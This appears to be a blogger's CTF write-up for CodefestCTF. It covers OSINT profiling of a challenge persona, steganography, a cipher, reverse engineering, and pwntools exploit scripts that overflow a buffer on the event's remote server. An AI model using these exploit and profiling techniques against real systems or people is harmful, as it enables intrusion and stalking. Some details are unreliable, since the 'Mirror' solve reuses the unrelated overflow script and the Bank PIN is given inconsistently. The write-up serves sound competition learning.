
![](https://grey-4.github.io/picture-repo/codefestctf/banner.png)

---

Yesterday, I had participated in the CTF event organized by [IIT(BHU)](https://iitbhu.ac.in/), Varanasi. It was a tedious 36-hour CTF event. Going solo (almost), I had one hell of a time solving challenges alone. This CTF had challenges in categories such as:

- OSINT
- Forensics
- Steganography
- Web
- PPC (Professional Programming Challenges)
- Rev
- Pwn
- Crypto
- Misc

Wow... okay. That's a lot of categories. Our team managed to solve 20 Out of these, I contributed to 17 of them. We ranked 52 out of the 720 teams that participated.

> Caution: It's gonna be a big write-up.

---
# OSINT

## JEE (Advanced)

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/JEE%20(Advanced).png)

The CTF event had a chain OSINT event. First of all, we were given the name `Arnav Kumar Sinha`, and we needed to find his JEE year and rank.  
I put his name in Google and found his LinkedIn profile:

![](https://grey-4.github.io/picture-repo/codefestctf/jee_advanced_sol.png)

Upon viewing his profile, I got this:

![](https://grey-4.github.io/picture-repo/codefestctf/jee_advanced_sol_1.png)

`Flag: CodefestCTF{2022_858}`

## JEE Main

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/JEE%20Main.png)

This one was very easy. I saw images in the Google search and found this YouTube video with his percentile.

![](https://grey-4.github.io/picture-repo/codefestctf/jee_main.png)

`Flag: CodefestCTF{99.72}`

## Alias

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Alias.png)

This was the easiest one for me. I had tried to search for his social media, which gave away nothing. Then I got an idea: we had his LinkedIn, and I knew this one hidden feature (not really) in LinkedIn, which is that we can change our URL to our liking. I checked his URL, and hell yeah!

![](https://grey-4.github.io/picture-repo/codefestctf/alias_sol.png)

`Flag: CodefestCTF{iedfa}`

## CP

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/CP.png)

After searching for a long while, I realized I might not be doing it right. After an hour of agony, I remembered that URLs can have usernames.

And searching with `iedfa`, I got the ratings:

![](https://grey-4.github.io/picture-repo/codefestctf/cp_sol_1.png)

![](https://grey-4.github.io/picture-repo/codefestctf/cp_sol_2.png)

`Flag: CodefestCTF{1687_1769_2018}`

## Github

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Github.png)

This challenge is also related to the Alias challenge. Since it says Github, I searched for his username in Github, which yielded no result. Then I tried again with the username and got his Github:

![](https://grey-4.github.io/picture-repo/codefestctf/github_sol.png)

`Flag: CodefestCTF{JustAnAverageGuy}`

## Present Sir!

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Present%20Sir!.png)

Back to the first challenge. When I was searching using his name again on Google, after some pages, I got this PDF from IIT (BHU) Varanasi:

![](https://grey-4.github.io/picture-repo/codefestctf/Present%20Sir!_sol.png)

![](https://grey-4.github.io/picture-repo/codefestctf/Present%20Sir!_sol_1.png)

`Flag: CodefestCTF{22075013}`

## Why do they even need this?

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Why%20do%20they%20even%20need%20this%3F.png)

This challenge is the final boss. This is that one challenge which we thought was hard but was actually easy af. I got to his Github and started searching every repo for "username" and "hostname". For some 11 hours, this challenge had successfully made me mental. What I did finally with some hints was:

![](https://grey-4.github.io/picture-repo/codefestctf/Why%20do%20they%20even%20need%20this%3F_sol.png)

By doing `owner:JustAnAverageGuy /home`, I got his username, which is `aks`. But trying `owner:JustAnAverageGuy aks` didn't give anything useful. So I used `owner:JustAnAverageGuy aks@`, which refers to the usual prompts on Ubuntu or Ubuntu-based systems, and BOOM!

![](https://grey-4.github.io/picture-repo/codefestctf/Why%20do%20they%20even%20need%20this%3F_sol_!.png)

`Flag: CodefestCTF{aks_aks-Inspiron-3505}`

## KVT

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/KVT.png)

A simple geo-OSINT challenge based around Varanasi. Using Google Lens, I narrowed down the picture's location to the correct area:

![](https://grey-4.github.io/picture-repo/codefestctf/KVT_sol.png)

![](https://grey-4.github.io/picture-repo/codefestctf/KVT_sol_1.png)

Then, using Google Maps, I found the location, but we needed to pin down the exact coordinates and round them up to four digits. Using the picture 360-degree feature, I found the exact same image:

![](https://grey-4.github.io/picture-repo/codefestctf/KVT_sol_2.png)

As we can see, there are coordinates of the location in the link. After rounding up the latitude and longitude:

`Flag: CodefestCTF{25.3071_83.0104}`

## College

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/College.png)

Just like the challenge before:

- Performed a Lens search and found the place using it.

![](https://grey-4.github.io/picture-repo/codefestctf/College_sol.png)

- Couldn't find the exact place. Searching around, I found this:

![](https://grey-4.github.io/picture-repo/codefestctf/College_sol_1.png)

![](https://grey-4.github.io/picture-repo/codefestctf/College_sol_2.png)

- Searched with `Madan Mohan Malviya Statue, Varanasi` and found it.

![](https://grey-4.github.io/picture-repo/codefestctf/College_sol_3.png)

- Found a street view and got to the exact position.

![](https://grey-4.github.io/picture-repo/codefestctf/College_sol_4.png)

- Found the latitude and longitude using the URL.

`Flag: CodefestCTF{25.2779_83.0024}`

This concludes the OSINT challenges. I had a lot of fun solving the challenges, except when I couldn’t.

Takeaway:

> What do you know about Arnav Kumar Sinha?  
> Me: Yes

# Forensics/Steg

For steganography, I often use [Aperisolve](https://aperisolve.com).

## DogeCoin

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/DogeCoin.png)

Inputting the image in Aperisolve, I started looking for any hints. Then I found this suspicious string that was similar to Base64 in the `zsteg` section (this can also be solved by the `zsteg` tool). Using [CyberChef](https://cyberchef.org)'s auto-detector, I found it was actually a Base32 encoding and decoded it.

![](https://grey-4.github.io/picture-repo/codefestctf/DogeCoin_sol.png)

![](https://grey-4.github.io/picture-repo/codefestctf/DogeCoin_sol_!.png)

`Flag: CodefestCTF{51mpl3_lsb_573g0_ftw}`

## Cats

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Cats.png)

In this challenge, many people (me >.<) struggled to solve it because you need to use the right tool. Using `stegseek` with `rockyou.txt`, we can extract the text file from the image and get the flag.

```
stegseek chall.jpg /path/to/rockyou.txt`
```

![](https://grey-4.github.io/picture-repo/codefestctf/cats_sol.png)

`Flag: CodefestCTF{573gh1de_ch4ll_m30w}`

## RickRoll

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/RickRoll.png)

The "I" in the description refers to the author (0xkn1gh7). Since the said tool is documented and related to ctf, my idea was that it would be mentioned in a write-up. So I searched using his name and got this:

![](https://grey-4.github.io/picture-repo/codefestctf/RickRoll_sol.png)

Since we were given an MP3 file (and `mp3` was in the write-up), searching for "mp3" yielded this:

![](https://grey-4.github.io/picture-repo/codefestctf/RickRoll_sol_1.png)

The tool name is [Stegonaut](https://stegonaut.com).

For the password: remember we were given a `cover.png`. Inputting it in Aperisolve, I found a unique password, `giveupplease`.

![](https://grey-4.github.io/picture-repo/codefestctf/RickRoll_sol_3.png)

Inputting it as the password, we successfully get a Base64 string, and decoding it gives the flag:

![](https://grey-4.github.io/picture-repo/codefestctf/RickRoll_sol_4.png)

![](https://grey-4.github.io/picture-repo/codefestctf/RickRoll_sol_5.png)

`Flag: CodefestCTF{1e55_kn0wn_573g0_700l}`

# **Crypto**

## Rat with Wings?

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Rat%20with%20Wings%3F.png)

For this challenge, I knew where to decode right away! I went to [dCode](https://www.dcode.fr/symbols-ciphers) and started searching for the symbol language resembling the given one. I found this:

![](https://grey-4.github.io/picture-repo/codefestctf/Rat%20with%20Wings%3F_sol.png)

Decoding it, I got:

![](https://grey-4.github.io/picture-repo/codefestctf/Rat%20with%20Wings%3F_sol_1.png)

`Flag: CodefestCTF{IAMBATMAN}`

# Pwn

## Mirror

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Mirror.png)

When I did `nc` with the given host and port, I was prompted to enter anything.

![](https://grey-4.github.io/picture-repo/codefestctf/Mirror_sol_1.png)

So I tried a buffer overflow, but it didn't work. Then I tried a format string vulnerability and got something:

![](https://grey-4.github.io/picture-repo/codefestctf/Mirror_sol_2.png)

Hmm... doesn't it seem like hex values? Anyway, I wrote an exploit program using Python.

```
from pwn import *

context.binary = binary = "./chall"
payload = b"a"*32 + p32(0x23456723)
print(payload)
p = remote("codefest-ctf.iitbhu.tech",59267)
# p = process()
p.sendline(payload)
p.interactive()c
```

This will input the exploit payload and print the values unhexed. Running the program, I got:

![](https://grey-4.github.io/picture-repo/codefestctf/Mirror_sol.png)

The flag was a bit messed up. After arranging them properly, we get:

`Flag: CodefestCTF{f0rm4t_57r1ng_l34k_sk41wUet}`

## Admin?

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Admin%3F.png)

Running the challenge file, we are prompted to enter something:

![](https://grey-4.github.io/picture-repo/codefestctf/Admin%3F_sol.png)

I checked if I could buffer overflow the program, and to my surprise, I could. After trying some things, I decided I should perform **AMM (Arbitrary Memory Modification)**. So I decompiled the challenge file using `Cutter`.

```
undefined4 main(int argc) {
    int32_t unaff_EBX;
    char *s;
    unsigned long var_14h;
    int32_t var_10h;
    
    var_10h = (int32_t)&argc;
    __x86.get_pc_thunk.bx();
    setbuf(**(undefined4 **)(unaff_EBX + 0x2d15), 0);
    banner();
    var_14h = 1;
    fgets(&s, 0x32, **(undefined4 **)(unaff_EBX + 0x2d11));
    if (var_14h == 0x23456723) {
        win();
    } else {
        printf(unaff_EBX + 0x1069, var_14h);
    }
    return 0;
}
```

I crafted my payload based on the decompiled program. I inputted 32 `a`s to overflow the buffer and place the value in `var_14h`.

```
from pwn import *

context.binary = binary = "./chall"
payload = b"a"*32 + p32(0x23456723)
print(payload)
p = remote("codefest-ctf.iitbhu.tech", 59267)
# p = process()
p.sendline(payload)
p.interactive()
```

Running the exploit, we were able to modify the value in `var_14h` and trigger the `win()` function.

# Rev

## Bank

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Bank.png)

The challenge ELF file prompts for a PIN, and we should be able to get the flag if we find the PIN. Decompiling the challenge file, we are greeted with this:

```
undefined8 main(void) {
    int32_t iVar1;
    char *s;
    setbuf(_stdout, 0);
    banner();
    printf("[*] ENTER YOUR PIN: ");
    fgets(&s, 0xd, _stdin);
    iVar1 = check((char *)&s);
    if (iVar1 == 0) {
        puts("[!] VAULT IS EMPTY!");
    } else {
        print_flag();
    }
    return 0;
}
```

The input is passed as a parameter to the `check` function. Looking at the `check` function:

```
void check(char *arg1) {
    char *var_60h;
    int64_t var_58h;
    undefined4 var_20h;
    int32_t var_1ch;
    int32_t var_18h;
    int32_t var_14h;
    int32_t var_10h;
    int64_t var_ch;
    
    for (var_ch._0_4_ = 0; (int32_t)var_ch < 0xc; var_ch._0_4_ = (int32_t)var_ch + 1) {
        *(int32_t *)((int64_t)&var_58h + (int64_t)(int32_t)var_ch * 4) = arg1[(int32_t)var_ch] + -0x30;
    }
    
    var_10h = 0;
    for (var_14h = 0; var_14h < 0xc; var_14h = var_14h + 1) {
        var_10h = var_10h + *(int32_t *)((int64_t)&var_58h + (int64_t)var_14h * 4);
    }
    
    if (var_10h == 0x30) {
        var_18h = 1;
        for (var_1ch = 0; var_1ch < 0xc; var_1ch = var_1ch + 1) {
            var_18h = *(int32_t *)((int64_t)&var_58h + (int64_t)var_1ch * 4) * var_18h;
        }
        if (var_18h == 0x51000) {
            var_20h = 0;
        }
    }
    return;
}
```

What this function essentially does:

- Check if the **sum of digits** of the input is `0x30` (48 in decimal).
- Check if the **product of digits** is `0x51000` (331776 in decimal).
- Ensure the input is **12 digits long** (`0xd - 1` due to the null terminator).

We can brute-force the correct value or use some math to deduce the PIN. After some exploration, I got the PIN: `1112266688` (there could be other combinations).

```
from pwn import *

context.binary = binary = "./chall"
payload = '111122666688'
p = remote("codefest-ctf.iitbhu.tech", 8063)
p.recv()
p.sendline(payload)
p.interactive()
```

Running the script, I got:

![](https://grey-4.github.io/picture-repo/codefestctf/bank_sol.png)

`Flag: CodefestCTF{n0_10g1c_15_54f3_75lFUPCZ}`

## Nothing

Desc:

![](https://grey-4.github.io/picture-repo/codefestctf/Nothing.png)

This was an interesting challenge. When I ran the file, it did nothing. So I decompiled it to see what was going on inside.

```
int64_t sub_1189(char* arg1)
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    int32_t var_d8;
    __builtin_memcpy(&var_d8, "\"\n\r\n…", 0x54);
    int32_t var_84 = 0;
    int32_t var_80 = 0;
    int32_t var_7c;
    __builtin_memcpy(&var_7c, "\x3e\x00\x00\x00\x08\x00\x00\x00\x5d\x00\x00\x00\x16\x00\x00\x00\x2a\x00\x00\x00\x1e\x00\x00\x00\x45\x00\x00\x00\x5b\x00\x00\x00\x19\x00\x00\x00\x3a\x00\x00\x00\x1f\x00\x00\x00\x43\x00\x00\x00\x31\x00\x00\x00\x5a\x00\x00\x00\x53\x00\x00\x00\x07\x00\x00\x00\x5f\x00\x00\x00\x01\x00\x00\x00\x13\x00\x00\x00\x15\x00\x00\x00", 0x50);
    
    for (int32_t i = 0; i <= 0x2a; i += 1)
        putchar(arg1[COMBINE(0, i) % strlen(arg1)] ^ (&var_d8)[i]);
    
    puts(&data_2004);
    
    if (rax == *(fsbase + 0x28))
        return rax - *(fsbase + 0x28);
    
    __stack_chk_fail();
    /* no return */
}

int64_t sub_13bc(char* arg1)
{
    FILE* fp = fopen(arg1, u"r…");
    
    if (!fp)
        return 0;
    
    fclose(fp);
    return 1;
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    void* fsbase;
    int64_t rax = *(fsbase + 0x28);
    int64_t var_28;
    __builtin_strcpy(&var_28, "aeiousvowels\\idonothing");
    int32_t result;
    
    if (sub_13bc(&var_28))
    {
        sub_1189(&var_28);
        result = 0;
    }
    else
        result = 1;
    
    *(fsbase + 0x28);
    
    if (rax == *(fsbase + 0x28))
        return result;
    
    __stack_chk_fail();
    /* no return */
}
```

Key logic:

- `var_28` = `"aeiousvowels\idonothing"`.
- The string is passed to `sub_13bc`, which checks if a file named `"aeiousvowels\idonothing"` exists.
- If the file exists, it proceeds to XOR the string in `sub_1189` and prints the result.

**Solution:** Create a file named `aeiousvowels\idonothing` and run the challenge file. Doing so, I got:

![](https://grey-4.github.io/picture-repo/codefestctf/Nothing_1.png)

`Flag: CodefestCTF{n0_pr1n71ng_m4y_m34n_s0m37h1ng}`

# Misc

## Feedback

Click the link, give feedback, and submit it to get the flag.

## Sanity

The well-awaited sanity challenge. The FINAL BOSS!

> The solution for sanity is.. (author has been kidnapped)  
> 5 mins later  
> *Hoof... *pants... The OTHERS are targeting me for trying to reveal the answer. I don't know if I can live past this. I don't think I have the time to give the full solution.  
> But I will give a hint:  
> This is not the only time a challenge named sanity or sanity check has appeared.  
> Oh no!!! They are here! Goodbye, guys!...  
> *Shooting sounds *Screams

---

# Conclusion

This CTF was fun. I had lots of learning and exploration. And I scored well too!

**Note:** It is written before sanity because I know the risks :)